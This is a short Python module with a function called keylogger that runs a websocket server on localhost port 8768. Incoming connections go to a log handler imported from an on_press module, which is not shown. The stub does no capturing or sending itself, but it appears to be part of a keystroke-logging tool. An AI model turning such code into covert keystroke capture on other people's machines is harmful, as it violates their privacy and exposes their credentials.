import asyncio
import websockets
from .on_press import log

def keylogger():
    try:
        server = websockets.serve(log, "localhost", 8768)
        asyncio.get_event_loop().run_until_complete(server)
        asyncio.get_event_loop().run_forever()  
    except KeyboardInterrupt:
        print('exit')
